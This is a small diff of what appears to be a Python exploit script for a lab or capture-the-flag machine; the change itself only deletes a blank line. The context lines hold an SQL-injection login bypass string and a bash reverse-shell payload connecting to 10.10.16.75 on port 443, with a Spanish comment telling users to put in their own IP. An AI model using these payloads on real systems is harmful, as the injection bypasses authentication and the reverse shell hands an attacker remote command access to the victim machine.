@@ -30,7 +30,6 @@ bypass_sqli = "username: ' or 1 -- //"
 lport = 443
 
 def makeRequest():
-
     # Cambiar IP por la vuestra
     payload_malicious = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.75/443 0>&1'"
     payload_malicious_bytes = payload_malicious.encode('ascii')
